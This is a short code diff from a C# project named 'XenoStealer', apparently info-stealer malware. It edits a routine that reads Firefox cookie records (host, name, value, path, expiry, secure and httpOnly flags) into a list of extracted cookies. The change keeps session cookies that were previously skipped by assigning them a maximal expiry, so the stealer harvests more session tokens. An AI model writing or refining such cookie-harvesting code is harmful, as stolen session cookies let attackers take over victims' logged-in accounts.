@@ -188,10 +188,16 @@ namespace XenoStealer
                     bool secure = parser.GetValue<int>(i, "isSecure") == 1; 
                     bool httpOnly = parser.GetValue<int>(i, "isHttpOnly") == 1; 
 
-                    if (host==null || name == null || value == null || path == null || expiry == 0) 
+                    if (host==null || name == null || value == null || path == null) 
                     {
                         continue;
                     }
+
+                    if (expiry == 0)
+                    {
+                        expiry = int.MaxValue;
+                    }
+
                     cookies.Add(new DataExtractionStructs.GeckoCookie(host, path, name, value, expiry, secure, httpOnly));
                 }
                 catch 
